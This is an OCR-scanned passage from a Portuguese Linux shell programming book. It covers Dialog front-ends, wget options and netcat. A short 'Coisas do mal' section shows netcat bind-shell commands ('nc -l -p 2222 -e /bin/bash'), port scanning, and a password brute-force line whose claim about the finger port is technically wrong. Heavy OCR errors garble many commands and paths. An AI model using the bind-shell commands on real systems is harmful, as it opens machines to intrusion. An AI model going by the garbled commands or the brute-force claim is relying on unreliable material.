~gt<_J 
M 
m 
Dialog 
499 
O Dialog do time do Gnome, que usa a biblioteca GTK. 
Foi projetado para ser mais limpo e bem escrito do que o gdialog, porém 
se tornou incompatível com o dialog, pois usa opções diferentes na linha 
de comando (mais Zen e simples, segundo os autores). Há um script que 
garante a compatibilidade com o gdialog. 
Página no FreshMeat: http://freshmeat.net/projects/zenity 
FTP: http://ftp.gnome.org/pub/GNOME/sources/zenity/ 
CVS: http://cvs.gnome.org/bonsai/rview.cgi?cvsroot=/cvs/gnome&dir=zenity 
Udpm 
O "User Dialog Perl Module" não é um clone do Dialog, mas uma interface 
Perl para trabalhar de maneira padronizada com os seguintes "sabores": 
dialog, cdialog, whiptail, gdialog e Kdialog. 
Homepage: http://udpm.sourceforge.net/ 
pythondialog 
Módulo em Python para usar trabalhar de maneira padronizada com os 
seguintes "sabores": dialog, whiptail e Xdialog. 
Homepage: http://people. via .ecp. fr/-flo/2002/pythondialog/pythondialog. html 
Última Dica: É possível fazer um She// Script que escolha usar o Dialog 
texto ou o gráfico, dependendo se o usuário está no X ou não. Basta checar 
a existência da variável sorsPLAY. que só é definida quando o X está sendo 
executado. 
Onde Obter Mais Informações 
Uma pesquisa no Google mostra que a Internet está deficiente em docu-
mentação para o Díalog. O mais relevante é um artigo introdutório em in-
glês no Linux Journal. 
Junto com o programa Dialog, tem alguma documentação em inglês. Tem a 
sua página de manual ("http://www.cl.cam.ac.uklcgi-bin/manpage?1 +dialog") 
500 Programação Shell Linux 
que numa linguagem direta e sucinta traz detalhes sobre o seu funcionamen-
to. Há também um diretório chamado samples, onde há scripts funcionais de 
exemplo de todos os tipos de caixa. 
Na página do Thomas Dickey (http://dickey.his.com/dialog/), o mantens-
dor atual do Dialog, há poucas informações, porém lá está o link para os 
fontes do programa. 
Em português, a melhor fonte de informações é utilizar a lista Shell-script 
(http://br.groups.yahoo.com/group/shell-script/) para obter ajuda e compar-
tilhar experiências com outros usuário do Dialog. 
O endereço oficial deste documento é http://aurelio.net/Shell/dialog/ 
_tf!!} _ 
Mate ria com d r bs a;.Jtora!S 
·Apêndice 5 
Peripécias pela Rede,. 
Fazendo download com o wget37 
Principais opções 
Seu navegador se responsabiliza pela incumbência de 
buscar documentos da web e exibi-los, mas algumas ve-
zes precisamos de um gerenciador de download parrudo 
e versátil. Para isso existe um programa chamado "'9et, 
que é uma ferramenta leve e altamente eficiente, que pode 
cuidar de todas as suas necessidades de download. 
Se você quer espelhar um web site inteiro, baixar au-
tomaticamente músicas ou filmes de um conjunto de 
weblogs favoritos, ou transferir sem medo arquivos enor-
mes em uma conexão de rede lenta ou intermitente, ,.,9e t 
é para você. 
O wg e t tem uma linha de comandos versátil e extensa, 
isso pode fazer com que nos percamos no princípio, mas 
basta memorizar alguns comandos. 
36. Corrigido, filtrado e ampliado pelo querido amigo Jansen Carlo Sena. Va-
leu Jansen! 
37. Uma parte deste apêndice foí traduzida de http://usuarios.lycos.es/nala-
sab/dev/online.php?code=2&id=16. Não conheço o autor, porém sou agra-
decido. 
501 
Mate ria com d r bs a;.Jtora!S 
502 Programação Shell Linux 
Para baixar uma página inteira, devemos fazer: 
wget URL 
Por exemplo: 
$ wget http://localhost/~DaMaeJoana 
Se quisermos armazenar uma página complexa, isto é, incluindo ima-
gens, sons, CSS, ... deveremos utilizar o argumento -p. como a seguir: 
$ wget -p http://localhoot/-DaHaeJoana 
o arquivo index . h tml estará em I localhost/ ~ 7EDaMaeJoana . Isto é por-
que o .,9e t cria por padrão (default) uma hierarquia de diretórios com do-
mínio/subdiretórios/arquivos. Então se fizermos: 
$ wget -p http:// www .google.com 
Será criado o diretório . /wl·r.·J. googl e . com. Para evitar isso, podemos 
usar os seguintes modificadores: 
$ wget -p -nH --cut-dirs=l http://localhost/~DaMaeJoana/ 
S ls 
img 
i ndex . html 
mai n.css 
Onde: 
- nH 
--c:::ut- di t-'=n 
Não permite a criação do subdiretório localhost; 
Elimina n número de diretórios na hierarquia. No exem-
plo colocamos 1, portanto não será criado o diretório 
~ 7EDaMaeJoana. 
Vejamos um exemplo retirado da página do manual do wget 
<man 
wget> . Suponhamos que desejamos baixar o xemac$ que se encontra 
em ftp : //ft p . xemacs .org/pub/xemacs/. 
De acordo com os argumentos passados ao wg e t, o download será feito 
de acordo com os diretórios da tabela a seguir: 
Mate 
com d r~•tos autCYa s 
Peripécias pela Rede 
503 
g Opção wget 
Diretório gerado 
"------'-'----- -----------
Sem opções 
ftp.xemacs.org/pub/semacs/ 
I====== 
-nH 
pub/ xemacs/ 
-nH -cut-dirs=l xemacs/ 
-nH -cut-dirs=2 
--cut-di rs=l 
ftp. xemacs. org/xemacs/ 
Para baixar todos os arquivos que se encontram no diretório pub/xemacs 
do ft:p citado, podemos usar a opção -r cou --recurs>.ve) . Esta opção 
funciona de forma similar às dos comandos 1s e rm. 
Se desejamos especificar uma profundidade para o mergulho que o wget 
dará na URL, podemos usar a opção -1 n (ou -leve1=n) onde n é o nú-
mero que define a profundidade que o wget deverá mergulhar. Seu padrão 
(default) é 5, isto é, se for passado -1 ou -1 s. será a mesma coisa. 
Em se tratando de um arquivo de HTML, a opção -1 especifica até que 
profundidade os links devem ser seguidos. 
Em algumas páginas (principalmente de mp3), em vez de criar links no 
próprio arquivo HTML, oferecem outro arquivo com os endereços das URLs. 
Para baixar o conteúdo desse arquivo, só teremos que utilizar a opção -i 
arquivo c ou --i nput:- lile~arqu>.vo), onde o arquivo arquivo contém a lista 
de URLs a serem baixadas. 
$ wgot -i http://w~~.sorvidor.com/conta/arquivo . com.urls 
Se, por outro lado, for uma página HTML que contém links para arquivos 
que nos interessam, teremos de forçar o wget: a seguir esses links. Para 
isso fazemos: 
$ wget -r -1 1 
-np -f - i http://www.gnu . o rg/downloads/emacs .hbnl 
Onde a opção - np (ou - - no-parent:) diz ao wget para não baixar ar-
quivos que se encontram em um nível superior dentro da hierarquia de 
diretórios. No exemplo acima, http : I/>IW1• . gnu . org/index . html não seria 
baixado, embora tivesse link dentro de emacs . html . 
504 Programação Shell Linux 
As vezes você baixa uma URL inteira e no fim de um monte de tempo 
gasto verifica que um link importante estava quebrado e uma página fun-
damental para o seu trabalho não havia sido baixada. Isso é muito irritante 
e te dá vontade de chutar o computador ... (não esqueça que software é o 
que nós xingamos e hardware é o que chutamos:) É justamente para evitar 
essa desilusão que existe a opção --spider . Com esta opção em uso, o 
wget não baixará as páginas, simplesmente checará se elas estão lá. 
Vejamos se meus bookmarks estão íntegros: 
$ wget --spider --force-html - i bookmarks.html 
Nesse exemplo, a opção --force-html (ou - E") trata o arquivo de entra-
da como HTML. 
Segundo o man wget , essa opção necessita ainda ser muito trabalhada 
para que o wget chegue perto das funcionalidades dos verdadeiros web 
spiders. 
Suponha que você esteja em um site de músicas e ainda que você não 
admita absolutamente nada proprietário nem pirata no seu computador. 
Dessa forma, você jamais baixaria músicas no formato mp3, que é proprie-
tário. Baixaria somente músicas no padrão Ogg Vorbis (extensão . ogg . 
Veja http://en.wikipedia.org/wiki/Ogg). Essa filtragem pode ser feita como 
no exemplo a seguir: 
$ wget -nH -r -A ogg -f -i http://www.musicaslivres.com.br 
A nova opção apresentada foi a -A lista ou (--accept lista). É bom 
saber que a lista pode conter vários elementos, separados por vírgulas 
(, l . Para comprovar isso, vejamos um caso onde eu queira somente os 
arquivos de fotos nos padrões jpg, bmp ou png. 
$ wget - nH -r - A jpg, bmp, png -f - i http://www.playboy.com 
;-) 
O oposto da opção - A é a opção -R lista (ou --reject lista), onde os 
componentes da lista lista estão separados por vírgulas (, ) . 
Um problema é que o wget por padrão gera muito tráfego de informação 
para a stdout. Veja: 
Peripécias pela Rede 
505 
$ wget http://1oca1host 
--19 : 02 : 35--
http : //localhost/ 
=> ' index .html' 
Resolving localhost . .. 127 . 0 . 0 . 1 
Connecüng co locolhost 1121 .O . O .1 1:80 .. . connect ed. 
HTTP r e quest sent, a Haiting response ... 302 Found 
Locati on : http : //localhost/apache2- default/ (following] 
--19 : 02 : 35--
http: //localhost/apache2-default/ 
•> ' index .html' 
Reusing existing connection to localhos t :80 . 
HTTP .request sent, awaiting .response ... 200 OK 
Length : 1 , 457 (1.4K) (text/html! 
100, [===================================>1 1,457 
19 : 02 : 35 ( 41. 2 5 f.IB/s ) -
'index.htrn1 ' .saved [ 1457/14571 
-- . --K/s 
Como eu disse, foi gerada um monte de informação e repare que só bai-
xamos um arquivo de 1457 bytes. 
Basicamente, temos duas opções para evitar tanta troca de mensagens: 
- q 
( ou ••quie t ) 
- nv (ou --no-verbose) 
Desliga a saída do wget; 
Desliga o modo "falador" sem ficar totalmente 
calado como o - q , isto é, as mensagens de 
erro e as informações básicas continuam indo 
para a saída padrão. 
Vamos testar usando estas opções para ver o resultado: 
$ wget -nv http: //1oca1host 
19 : 27 : 3~ URL: http://1oca1host/apache2-defaul t/ ( 1457/1~571 -> "index.html" (11 
$ wgct -q http://1ocalhost 
$ l s 
index . h~ml inctex .html .l 
i ndex.htrnl . 2 
Como vimos, usando o modo "não falador" <--no-vecbosel só vai uma 
linha para a tela e no modo calado <--quietl não é gerada nenhuma linha. 
Vimos também após o ls que o padrão do wget é não destruir versões an-
teriores do arquivo, em vez disso, coloca um número sequencial que atua 
como se fosse uma versão. 
Mate ria com d r bs a;.Jtora!S 
506 Programação Shell Linux 
Com a opção - nc (ou --noclobbe·r ) caso já exista um arquivo homôni-
mo, o wget não baixará o novo. 
Usando o wget com proxy 
Muitos ambientes de rede hoje, por questões de segurança, não permi-
tem que os computadores de sua rede se conectem diretamente em ser-
vidores web na Internet. Essa tarefa deve ser executada por um servidor 
proxy. 
Nesse contexto, as aplicações que precisam acessar a Internet repas-
sam suas solicitações ao proxy que, por sua vez, retornam os dados recebi-
dos dos servidores aos clientes internos da sua rede. Caso esse seja o seu 
cenário, ao tentar utilizar o ,.9et em um ambiente de rede com proxy, para, 
por exemplo, salvar uma página da Internet, o valente aplicativo de linha 
de comando não irá funcionar. Isso se deve ao fato de que o ~<ge t tentará 
acessar diretamente a Internet e acabará sendo barrado pelos firewa/ls. 
Para resolver esse problema, basta informar ao wget a respeito da exis-
tência do proxy. Isso pode ser feito de duas maneiras: por meio de uma 
variável de ambiente ou pelo seu arquivo de configuração. 
A primeira solução consiste em configurar uma variável de ambiente cha-
mada http_proxy que é utilizada por muitos programas, dentre os quais o 
próprio wget, para saber a respeito da existência de um proxy na rede. Defina 
a variável com a configuração correta e o .,9et funcionará normalmente. 
No exemplo a seguir, a variável de ambiente h t t p_ p roxy é definida con-
siderando que o endereço IP do proxy é 10. 1 . L . s e a porta de utilização é 
a 3128 . Em seguida, o wget é utilizado normalmente para obtenção de um 
arquivo na Internet. 
$ e xpor t http__proxy-"http: //10 .1 . 1.5: 3128" 
$ 
~<ge t -t - c 
O bttp : / / cdimage .ubunt u.com/releases/7.10/ release/ ubuntu-
7.10-dvd-i 396 .iso 
A segunda alternativa consiste em definir a variável http_ proxy dentro 
dos arquivos de configuração do 1-1get , o wgetrc, seja no especifico, locali-
zado no home do usuário, seja no global localizado, geralmente, no diretório 
/etc, utilizando-se da mesma sintaxe· mostrada para a primeira alternativa. 
Mate ria com d r bs a;.Jtora!S 
Peripécias pela Rede 
507 
Veja na seção a seguir (Arquivos de configuração) mais detalhes sobre 
esses arquivos. 
Vale ressaltar que essa segunda alternativa torna a configuração do proxy 
permanente e mesmo fechando seu terminal de comandos, ou mesmo rei-
niciando seu computador, o wget continuará instruído a solicitar suas ativi-
dades ao proxy. A primeira alternativa. entretanto, será válida somente para 
as execuções do wget realizadas a partir do terminal em que você definiu a 
variável htt.p_proxy. Diante disso, quando utilizar uma ou outra? Bem, se 
o seu computador fica na maioria do tempo integrado a uma mesma rede, 
onde a configuração do proxy será sempre a mesma, a segunda alternativa 
lhe poupará esforço. Entretanto, caso você precise fazer uma configuração 
para integrar, digamos, seu notebook a uma rede somente para utilizar o 
wget. pontualmente. a primeira alternativa lhe será mais adequada. 
Arquivos de configuração 
Os arquivos de configuração servem para personalizar algumas opções 
do wget de forma que não precisamos introduzi-las por linha de comandos. 
São eles: 
~1 .wgetrc 
Configuração pessoal de um usuário 
/usr/loca1Jetc/wgetrc 
Configuração Global 
/ etc/wgetrc 
Configuração Global (na maioria das distros) 
O arquivo geral de configuração do wget só fica no diretório 
/usr/local/etc/wgetrc quando o aplicativo é compilado na 
máquina. Caso o wget seja instalado por meio do geren-
ciador de pacotes, como o apt-get ou o RPM, o arquivo de 
configuração será /etc/wgetrc, como é o caso da grande 
maioria das distribuições hoje em dia. Por isso a observação 
"na maioria das distros". 
M I 
cvrn r to 
to 
s 
508 Programação Shell Linux 
Outras opções importantes 
-h, --help 
Mostra um resumo dos argumentos da linha de comandos. 
-b, --background 
Executa o "'gec em segundo plano (background). 
-o logfile , --output-fil e=l ogfile 
Manda para o arquivo 1ogfile as mensagens mais importantes. 
-a logfil e , --append- output=logfile 
Anexa ao arquivo l ogfile as mensagens mais importantes e as de erro. 
- q, - -quiet 
Modo silencioso. Inibe todas as saídas para stdin. 
-nv, --non -verbose 
Inibe a saída para stdin, exceto as mensagens importantes e as de erro. 
- i arquivo , - - input-fi lo= arquivo 
Recebe as URLs a serem baixadas de uma lista contida no arquivo 
arquivo. Note que tem de ser uma lista de URLs; no caso de ser um 
arquivo HTML, temos de usar a opção - r (ou --force - html). Se os 
links do arquivo HTML forem relativos, empregue a opção - - base=url. 
- t numero, --tri es numero 
Número de tentativas na hora de baixar um arquivo Se for especifica-
do o (zero) ou i n f será feito um número infinito de tentativas. 
- nc, --no-clobber 
No caso de baixarmos um mesmo arquivo mais de uma vez. se a 
opção - nc estiver ativada. o arquivo não será baixado novamente. 
Caso a opção não esteja ativada, o arquivo será baixado tantas vezes 
quanto for ordenado, porém adicionando-se um sufixo numérico se-
quencial ao seu nome para distinguir a versão do arquivo. 
-c, --continue 
Aconselhamos a usar sempre essa opção (ou pelo menos quando bai-
xar grandes arquivos). Ela torna o ,,9et um pouco mais lento, mas. em 
compensação. permite que um download seja recomeçado do ponto 
em que parou. Se o servidor não suporta downloads com recomeço e 
se já existir arquivo com o mesmo nome. wge t não fará nada. 
Mate ria com d r bs a;.Jtora!S 
Peripécias pela Rede 
509 
--spider 
wget se comporta como um webspider, isso significa que ·•get so-
mente testará a existência ou não dos links. 
- w tempo, - -wait tempo 
Espera o número de segundos especificados em tempo entre duas 
requisições. Pode-se especificar em minutos, horas e dias anexando 
os sufixos m, h , e d , respectivamente. 
--waitretry~seconds 
Se você não deseja esperar um tempo entre cada download, mas somen-
te entre as tentativas após falhas, use essa opção. Note que após a 1a 
tentativa, esperará 1 segundo, após a 2a, 2 segundos e assim por diante. 
-Q quota, --quota=quota 
Especifica um tamanho máximo para os downloads automáticos (de algu-
ma forma programados). O tamanho é especificado em bytes por padrão, 
mas pode-se usar os sufixos k (para kilobytes) ou m (para megabytes). 
-nd, --no-directories 
Não cria a hierarquia de diretórios quando fazendo download recursi-
vamente. 
-x, --force-directories 
Força a criação da hierarquia de diretórios. Por exemplo: 
wget - x http : //www . julioneves. com 
será armazenado em www . julioneves . com. 
-nH, --no-host-directories 
Não cria a estrutura de diretório com o nome do host como normal-
mente faz. Assim, se fizermos: 
wget -nH http: //www . julioneves .com 
obteremos o arquivo index . html no diretório corrente. 
--cut-dirs~n 
Ignora n componentes de diretório. Um exemplo composto para elu-
cidar este e o anterior: 
A URL é 
ftp : I I Etp . xemacs . org/pub/xemacs/ 
Sem opções 
ftp . xemacs . org/;>ub/xemacs/ 
- nH 
pub/xemacs/ 
-nH -cut-dirs•l 
xemacs/ 
- nH -cut-dirs=2 
510 Programação Shell Linux 
- P pref i xo, - -directory-prefix=prefixo 
Os arquivos serão baixados a partir do diretório prefixo. Exemplo: 
$ wge t -P s ite_do_ julio htt p ://www. julioneves.com 
$ ls - lR 
total ~ 
dn<xr- xr- x 2 j ulio j ulio 4 096 2007- 08- 19 14 : 31 site_do_ j ulio 
. /si r.e_do_ju l i o: 
total 16 
-rw-r--r-- l j ulio julio 1 5771 2007-08-19 14 : 31 i ndex.h t ml 
-E , - - html -extension 
Se baixarmos um arquivo do tipo text/html e a URL não termina 
em htm ou html (ambos com qualquer combinação de maiúsculas e 
minúsculas}. esta opção forçará um sufixo hUm no arquivo baixado. 
Um bom uso para isso é quando você baixa CGis. Uma URL como 
ht tp ://site .com/article . cgi725 será baixada como article . cgi ? 
2 5 . html. 
-r , --recursi ve 
Ativa o modo recursivo. 
- 1 n , --level profundidad 
O número n especifica o nível de profundidade máximo quando está 
em modo recursivo. 
--delet e - aft e r 
Usando essa opção, cada arquivo baixado será deletado no computa-
dor local. O seu uso seria para carregar o cache do proxy com os sites 
mais populares. Veja: 
$ wge t - r -nd --delete- after http ://www.j ulioneves . c om 
A opção - r é para baixar recursivamente e a - nd é para não criar 
diretório. 
- k, --c onve r t - links 
Depois que o download está completo, converte os links no arquivo 
que foi baixado para ficarem apropriados para a visão local. Isso afeta 
não somente os hyperlinks visíveis, mas qualquer parte do documen-
to que aponte para um índice externo. tal como imagens embutidas, 
CSS, hyperlinks conteúdo não HTML, etc. 
Mate ria com d r bs a;.Jtora!S 
Peripécias pela Rede 
511 
Os links serão modificados de uma das duas formas a seguir: 
1. Os links para arquivos que também foram baixados pelo 11get serão 
alterados para fazer referência ao arquivo como um link relativo (com 
caminho relativo). Exemplo: se o arquivo baixado for 1 too/doc . html 
e nele tenha um link para /bar/ img . gif, então o link em doe .html 
será modificado para . ./bar 1 img . gif. 
2. Se o arquivo apontado não foi baixado pelo wget, ele será modifica-
do para incluir o nome do host e o caminho absoluto do local aponta-
do. Exemplo: se o arquivo baixado / too/doc . htm apontar para /bar/ 
img .gH (ou para . . /bar-/img .git), então o link para doc . html será 
modificado para apontar para ht t p : 1 /NomeDoHos t /bar / i mg . gi f . 
- K. --bac kup- c onver t ed 
Quando convertendo um arquivo, copia a versão original com um su-
fixo .oüg . 
- m, - - nu.rror 
Liga as opções apropriadas para fazer o espelhamento. Essa opção 
liga a recursividade e o time-stamping e ajusta a profundidade de re-
cursividade para infinito. 
- p, 
--page -requ isi~es 
Essa opção faz com que wge t baixe todos os recursos necessários 
para uma visão correta do arquivo HTML (imagens, sons, CSS ... ). 
- A l i s ta --accep t l ista 
- R l i s t a --reject l ist a 
Aceita ou recusa lista que são listas de nomes de arquivos, de su-
fixos ou de padrões separadas por vírgulas (, l . Obs.: os padrões 
referidos são os mesmos caracteres curingas válidos para o comando 
ls . 
-L, --relative 
\oiget segue somente os links relativos. Opção útil para quando se 
quer baixar somente os recursos dentro da mesma página. 
- np, --no-parent 
Diz ao '"gec para não baixar arquivos que se encontram em um nível 
superior dentro da hierarquia de diretórios. 
Mate ria com d r bs a;.Jtora!S 
512 Programação Shell Linux 
Um exemplo legal que achei para que possamos ver o >lget em ação 
foi sugerido por Jeff Veen:Ja e é um uso muito legal desse comando. Atu-
almente, existem toneladas de diretórios, filtros e weblogs que apontam 
para uns tipos interessantes de mídias. Você pode criar um arquivo de 
texto com seus sites favoritos que tenham links para arquivos mp3 e to-
dos os dias, usando wget. você pode baixar automaticamente os arquivos 
recém-adicionados aos sites. 
Primeiro crie um arquivo chamado mp3_sit.es . t.xt. e nele liste as URLs 
que têm as músicas do estilo que você mais gosta, uma por linha (veja 
ht tp : I ldel. i c i o . usltagl system: filetype : mp3 
ou 
http : I I .stereogum. com 
ou então veja as dicas em http : I l"'w'·r. l ifehacl:er . comlso f t •,are/geek- to-
li vel geek- to- li ve- lind- f ree- music- on- the- web-136578 . php). 
Quando tudo estiver pronto use o seguinte comando: 
s «get -r -11 - H - t l - nd - N -np -A.mp3 -erobots=off -i mp3_sites . txt 
Onde a opção -e age como se incorporasse temporariamente a linha 
robots-o:f ao arquivo . ••getrc somente durante a execução desse co-
mando. 
Essa linha baixa recursivamente somente arquivos de mp3 cujos sites 
estão listados em mp3_sites . txt e que são mais novos que qualquer um 
que você já tenha baixado. 
O melhor disso tudo é que após você colocá-lo no seu c r on para ser 
executado com uma determinada periodicidade, você terá uma sempre re-
novada jukebox de alguns sites confiáveis que você escolheu. 
Algumas opções interessantes que podemos encontrar: 
Número de tentativas na hora de baixar um arquivo 
t r i ~s = 20 
Profundidade máxima em modo recursivo 
.reclevel • 5 
38. http://vmw. veen.com/jeff/archives/000573.html 
Mate 
com d r~•tos autCYa s 
Peripécias pela Rede 
513 
-
Tempo de espera entre tentativas (incremento linear, espera 1 s pri-
meira tentativa, 2s segunda tentativa, ... ) 
waitretry = 1 
-
Anexar cabeçalhos http 
header • frorn: teu nome 
header • Accept-Language : Pt. BR 
-
Criar estrutura de diretórios obtendo um único arquivo. 
dirstrcut• off 
-
Modo recursivo de forma automática 
recursive = of~ 
-
Criar um backup dos arquivos aos quais se aplica conversão (equiva-
le a ativar a opção -K) 
backup_converted= off 
-
Seguir por padrão (default) os links de ftps em arquivos HTML 
follow_ftp • off 
Brincando pela rede com o netcat 
Diversas publicações que li sobre o utilitário de rede netcat se referiam a 
ele como o "Canivete do Exército Suíço das Ferramentas de Rede", e por 
uma boa razão. Como os melhores utilitários Unix, seu uso é bastante sim-
ples, porém é capaz de executar diversas tarefas muito úteis. O seu nome 
é bastante significativo: atua como o comando cat, porém sua atuação se 
dá sempre na rede (que em inglês é net). 
No seu uso, devemos deixar uma máquina preparada para "ouvir" com 
netcat e outras da rede conectam-se a ela. Uma vez estabelecida a conexão 
podemos mandar texto, executar um comando She/1 na máquina remota e 
diversas outras coisas que você faria com o comando cat na máquina local. 
Na maioria das distribuições o netcat chama-se nc, porém em dlstn-
buições como o Ubuntu, por exemplo, o netcat pode ser chamado como 
netcat ou como nc . Um sempre é link simbólico para o outro e isso man-
514 Programação Shell Linux 
têm a compatibilidade com sistemas que utilizam somente uma das no-
menclaturas para o utilitário. Esse comportamento é mostrado a seguir e foi 
retirado de um sistema Ubuntu Linux 7.10: 
$ 1s - 1 /bin/netcat 
lrwxrwx:rwx l root root 2 2007-l0-20 12:55 /bin/netcat -> nc 
E é por esse motivo que ao longo deste apêndice ele será tratado de 
ambas as formas. 
Coisas do bem 
Abra duas janelas de comando no seu computador (ê necessário que o 
pacote de netcat esteja instalado). O que vamos fazer agora em somente 
um computador seria feito da mesma forma em mais de um, trabalhando 
através da rede. 
Em uma janela escreva: 
$ nc -1 -p 2222 
Isso diz ao netcat para iniciar um serviço TCP e ouvir (-1 de listen) a 
porta 2222 . 
Deixe de lado esta janela que aparentemente está congelada (somente 
aparentemente, pois ela está "ouvindo" a referida porta) e vamos para a 
outra janela. Lá digite: 
$ nc <endereço_IP_da_maquina_na_escuta> 2222 
Como o <ender eço_!P _da_maquina_na_escuta> é também o endereço da sua 
máquina, caso você não o saiba, substitua-o por l ocalhost (ou 121 . o . 0 . 1). 
Pois é, nada de excitante aconteceu até agora, parece que ambas as 
seções estão congeladas ... Mas tecle nesta segunda tela algo muuuuito 
original como " teste do netcat" : ) e aperte <ENTER>. 
O que aconteceu? Tudo que você escreveu apareceu na outra janela. 
Como dissemos, parece muito com o comando cat . 
O que foi descrito até agora aplica-se a transmissões TCP. Se você qui-
ser usar UDP, na primeira janela faça: 
$ nc - 1 -u -p 2222 
Mate 
com d r~•tos autCYa s 
Peripécias pela Rede 
515 
e na outra faça: 
$ nc - u localhos t 2222 
Onde a opção - u serve para levantar esse protocolo. 
Imitando um ftp 
Para travar conhecimento com o netcat o exemplo anterior valeu, mas na 
vida real o net:cat é sempre usado com um redirecionamento. Vamos vol-
tar à primeira janela para ver um exemplo clássico. Digite: 
$ notc~t - l - p 2222 > saida 
Como você pode ver, a saída do netcat está sendo redirecionada para 
o arquivo s aída . Agora vamos para a outra janela, mas primeiramente va-
mos preparar um arquivo chamado entrada : 
$ cat > e ntrada << fim 
> Vou passa_r o conteúdo do di retóri o $P'o\"D 
> $(ls I paste - - -
- ) 
> fim 
$ cat entrada 
vou paj~ar o conteúdo do diretóri o /home/jul io/t jtsh 
numpe.rf. sh 
past.or .sh 
out putfile 
Pacotes 
par 
p rocperf.sh 
scs . s h 
set acores2 . s h 
setacores . sh 
troca . sh 
tst . s h 
E vamos transmiti-lo: 
$ netcat local host 2222 - q 5 < entrada 
A opção - q foi usada para que o ne t c at caísse após o fim da trans-
missão, mas dei uma colher de chá de 5 segundos <-q S ) antes que isso 
ocorresse. Vamos testar: 
$ c a t saida 
Vou passa.r o conteúdo do diret.ór i o / home/ j ulio/ t stsh 
numpcrf . sh 
outputfilc 
Pacotos 
par 
pastor .sh 
procperf. sh 
scs.sh 
setacores2 . s h 
setacores . sh 
troca . sh 
tst.sh 
Você também pode usar o netca t para atuar como um ftp, copiando 
arquivos de (ou para) uma máquina remota. Vamos ver como mandar um 
arquivo de uma máquina apelidada de u nuxl para outra apelidada de 
linux2 . Em linux2 faça: 
$ nc - l 
- p 2222 > /arquivo/de/destino 
Mate ria com d r bs a;.Jtora!S 
516 Programação Shell Linux 
E em linuxl faça: 
$ nc <endereço_IP_da_maquina_linux2> 2222 < arquivo/da/orig em 
Tar bom assim? 
De acordo com o que você viu, já deve ter dado para perceber que você 
pode passar dinamicamente um monte de arquivos de uma máquina 
para outra usando o comando ta r em conjunto com o netcat . Veja-
mos: 
Na máquina que chamamos de linuxl façamos: 
$ tar cve -
/ path/ do/ di retorio I nc - w 3 < IP de Linux2> 2222 
E em linux2 faríamos: 
$ no - 1 - p 2222 I tar xvf -
Os arquivos que estavam no diretório /path/do/d iret orio de linuxl 
passaram pelo tar e, assim, como vimos no comando past e (na seção 
Perfumarias Úteis}, o pipe recebe o que foi gerado para a stdout, repre-
sentada por traço t- >, mandando tudo para o netca t . Na linha seguinte, 
o pipe de linux2 manda o que recebeu da máquina remota tlinuxl ) via 
netcat, para a stdin que, como já vimos, está também representada pelo 
traço <->, expandindo os arquivos em linux2 . 
Com o netcat é possível fazer backup integral de partições inteiras, como 
no exemplo a seguir: 
Computador que possui a partição a ser "backupeada": 
$ dd i f • / dev/ sda1 I netcat 10. 1.1 .1 2222 
Computador que irá receber o backup da partição (com endereço IP 
10 .1. 1 . 1): 
$ netcat -1 - p 2222 > / tmp/backup_particao_sda1.1so 
Um chat chato 
O n e t cat também permite estabelecer sessões de chat emulando o co-
mando write . Para fazer isso, o lado "escutador" deverá fazer: 
$ nc -vlp 2222 
Mate ria com d r bs a;.Jtora!S 
Peripécias pela Rede 
517 
Aqui a a opção -v significa verbose (algo como tagarela). 
O netcat não precisa conectar-se com ele mesmo. Ele pode conectar-
se com diversos serviços; desde que se conecte a uma determinada porta, 
ele sempre poderá "escutar" esta porta. Se você novamente colocar a sua 
máquina para escutar a porta 2222 , e para conectar-se a esta porta pelo 
navegador Firefox use o seguinte endereço: http : //localhost : 2222/ "0 l á 
Pessoal", então a sua janela de comandos apresentará algo assim (tirei 
algumas linhas para não poluir muito). 
G!IT /! 220llC3 AU20Pessoal• 22 HTTP/l . l 
Host: localhost: 2222 
Accept-l,dng uage : pt-br.:, pt; q-=0 . 8 , en-u.s ; q=O. 5 , en; q=O . 3 
l\ccept-Encodi ng : gzip, deflate 
Aecept-Chdtset: IS0 - 8859 - l ,utf - S ; q= 0 .7,•;q=0 . 7 
Keep-Alive: 300 
conn~ction : kêep-alive 
Coisas do mal 
O que vimos até agora sobre o netcat foi tudo do bem, porém ele pode 
também ser usado para fins não muito nobres, e por isso relutei muito em 
colocar esta seção no livro, mas como quero que ele fique cada vez mais 
próximo de uma obra completa sobre o ambiente orientado a caractere do 
Linux, a partir da sua 78 edição resolvi colocar. 
Abrindo uma porta para o inimigo (trojan) 
O exemplo a seguir somente funcionará (com a opção -e) se em tempo de 
compilação do nc foi colocada a opção GAPING_SECURITY _HOLE. Para 
abrir um She/1 remoto, faça: 
$ nc -l - p 2222 - e /bin/b ash 
Caso essa opção não tenha sido usada, pode-se fazer o mesmo da se-
guinte forma: 
$ nc - l - p 2222 I sh 
Nesse último caso, o atacante não terá na máquina cliente o resultado 
gerado pelos comandos executados no servidor. Entretanto, é possível uti-
Mate 
com d r~1tos autCYa s 
518 Programação Shell Unu.x 
lizar novamente o netcat no servidor e no cliente para devolver a saída do 
comando executado para o computador do atacante. 
E conecte-se a ele usando: 
$ nc <Endereço_IP_do_Destino> 2222 
Dessa forma você ganhará um bash que lhe permitirá executar todos os 
comandos e ver as suas saídas ganhando assim o domínio da máquina. 
Termine da mesma forma que você termina uma sessão de bash, isto é, 
tecle exit . 
Procurando portas abertas (scan) 
Se você quiser procurar portas abertas em uma máquina, use a seguinte 
construção: 
$ nc - v <endereço da máquina> 22-2222 
Assim, o net.cat testará todas as portas entre 22 e 2222 que estão respon-
dendo, parando na primeira aberta para troca de mensagens. Quando testei 
no meu computador, deu a seguinte mensagem indicando uma porta aberta: 
localhost [127 . 0 . 0 . 1) 631 (ipp) open 
Como não lembrava que porta era essa, testei a porta com o comando: 
$ nc -v localhost 631 
E mandei um QUIT que é quase um comando padrão para muitos tipos 
de porta TCP. Ele então me devolveu um monte de HTML, inclusive as li-
nhas a seguir: 
HTTP/1 . 0 400 Bad Request 
Date : Wed, 05 Sep 2007 18 :30 :36 G~T 
Server: CUPS/1 . 2 
Era a interface web do meu servidor de impressão. 
Testando senhas (brute force) 
Existem sites de crackers que fornecem arquivos com senhas mais usuais. 
De posse de um arquivo destes (que aqui chamaremos de senhas . txt) 
pode-se fazer o seguinte: 
$ nc - v 79 < senhas . txt > senhas_boas .txt 
Peripécias pela Rede 
519 
A porta usada foi a do finger (79) e foi a que mandamos o conteúdo 
do arquivo de senhas. Todas as senhas válidas serão armazenadas em 
senhas boas . t xt. 
Resumo 
As principais opções que vimos do netcat estão resumidas na tabela a 
seguir: 
Principais opções do comando netcat 
Opção Significado 
-e 0111 Executa o comando Clld usando dados da rede como entrada e 
